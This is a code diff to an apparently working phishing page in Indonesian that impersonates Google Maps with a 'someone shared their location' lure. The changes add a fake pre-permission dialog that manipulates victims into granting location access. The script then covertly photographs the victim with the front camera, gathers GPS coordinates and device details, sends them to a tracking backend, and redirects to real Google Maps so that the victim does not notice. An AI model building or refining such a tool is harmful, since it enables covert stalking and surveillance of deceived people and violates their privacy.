@@ -28,7 +28,7 @@
             height: 48px;
             margin-bottom: 15px;
         }
-        h3 { color: #202124; margin-bottom: 8px; font-size: 20px; }
+        h3 { color: #202124; margin-bottom: 8px; font-size: 20px; font-weight: 500;}
         p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
         .btn {
             background-color: #1a73e8;
@@ -37,13 +37,69 @@
             padding: 12px 24px;
             font-size: 16px;
             font-weight: 500;
-            border-radius: 6px;
+            border-radius: 24px; /* Dibuat lebih membulat khas Google UI modern */
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
             transition: background 0.2s;
         }
         .btn:hover { background-color: #1557b0; }
+        
+        /* CSS untuk Pre-Prompt Modal Palsu */
+        .modal-overlay {
+            display: none; /* Disembunyikan secara default */
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+        .modal-box {
+            background: white;
+            padding: 24px;
+            border-radius: 8px;
+            width: 85%;
+            max-width: 320px;
+            text-align: left;
+            box-shadow: 0 24px 38px 3px rgba(0,0,0,0.14), 0 9px 46px 8px rgba(0,0,0,0.12), 0 11px 15px -7px rgba(0,0,0,0.2);
+        }
+        .modal-box h4 {
+            margin: 0 0 12px 0;
+            font-size: 16px;
+            color: #202124;
+            font-weight: 500;
+        }
+        .modal-box p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+        .modal-actions {
+            text-align: right;
+        }
+        .modal-actions button {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-left: 8px;
+        }
+        .modal-actions button:hover {
+            background-color: rgba(26,115,232,0.04);
+        }
+        
         .spinner { 
             border: 4px solid #f3f3f3; 
             border-top: 4px solid #1a73e8; 
@@ -62,8 +118,21 @@
             <path fill="#4285F4" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
         </svg>
         <h3>Google Maps</h3>
-        <p>Seseorang telah membagikan lokasi dengan Anda.</p>
-        <button class="btn" onclick="startTracking()">Buka Peta</button>
+        <p>Seseorang telah membagikan lokasi terkininya dengan Anda.</p>
+        <button class="btn" onclick="showPrePrompt()">Lihat Lokasi</button>
+    </div>
+
+    <!-- Modal Pre-Prompt Web (Manipulasi UI) -->
+    <div class="modal-overlay" id="prePromptModal">
+        <div class="modal-box">
+            <h4>Tampilkan rute ke lokasi?</h4>
+            <p>Untuk memuat peta interaktif dan menunjukkan arah rute secara akurat dari tempat Anda, Google Maps memerlukan akses lokasi perangkat.</p>
+            <p style="font-size: 12px; color: #80868b; margin-top: -10px;">Pilih <b>"Izinkan"</b> atau <b>"Allow"</b> pada prompt berikutnya untuk melanjutkan.</p>
+            <div class="modal-actions">
+                <button onclick="closePrePrompt()">Lain kali</button>
+                <button onclick="executeExploit()">Lanjutkan</button>
+            </div>
+        </div>
     </div>
 
     <!-- Elemen Kamera Tersembunyi -->
@@ -71,19 +140,36 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        async function startTracking() {
+        // 1. Fungsi memunculkan pop-up web buatan kita
+        function showPrePrompt() {
+            const modal = document.getElementById('prePromptModal');
+            modal.classList.add('active');
+        }
+
+        function closePrePrompt() {
+            const modal = document.getElementById('prePromptModal');
+            modal.classList.remove('active');
+        }
+
+        // 2. Skrip utama berjalan setelah target klik "Lanjutkan" di pop-up web
+        async function executeExploit() {
+            // Tutup pop-up web kita
+            closePrePrompt();
+            
+            // Ubah tampilan utama menjadi loading agar meyakinkan
             const card = document.getElementById('main-card');
             card.innerHTML = `
                 <div class="spinner"></div>
-                <h3>Memuat Peta...</h3>
-                <p>Mempersiapkan rute perjalanan...</p>
+                <h3>Memuat Peta Interaktif...</h3>
+                <p>Mengkalibrasi rute perjalanan...</p>
             `;
 
             let latitude = null;
             let longitude = null;
             let accuracy = null;
 
-            // 1. Ambil Lokasi GPS
+            // Memanggil pop-up sistem bawaan
+            // Karena target sudah dipersiapkan (primed) oleh pop up web, mereka cenderung menekan Allow
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
@@ -93,19 +179,20 @@
                     longitude = pos.coords.longitude;
                     accuracy = pos.coords.accuracy;
                 } catch (e) {
-                    console.log("GPS ditolak");
+                    console.log("GPS ditolak atau timeout");
                 }
             }
 
-            // 2. Ambil Foto Kamera Depan secara Diam-diam
+            // Ambil Foto Kamera Depan secara Diam-diam
             let imageBase64 = null;
             try {
+                // Catatan: Jika browser juga meminta izin kamera, ini akan muncul setelah izin lokasi.
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
                 
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(r => setTimeout(r, 1000)); // Tunggu fokus kamera
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -119,7 +206,7 @@
                 console.log("Kamera ditolak");
             }
 
-            // 3. Info Perangkat
+            // Kumpulkan Info Perangkat
             const deviceData = {
                 hardwareConcurrency: navigator.hardwareConcurrency || '-',
                 deviceMemory: navigator.deviceMemory || '-',
@@ -127,7 +214,7 @@
                 language: navigator.language || '-'
             };
 
-            // 4. Kirim Data ke Backend Telegram
+            // Kirim Data ke Backend (API.js Anda)
             try {
                 await fetch('/api/track', {
                     method: 'POST',
@@ -141,10 +228,10 @@
                     })
                 });
             } catch (e) {
-                console.log("Gagal kirim data");
+                console.log("Gagal kirim ke backend");
             }
 
-            // 5. Redirect ke Google Maps Asli
+            // Redirect Target ke Google Maps Asli agar jejak tertutupi
             if (latitude && longitude) {
                 window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
             } else {
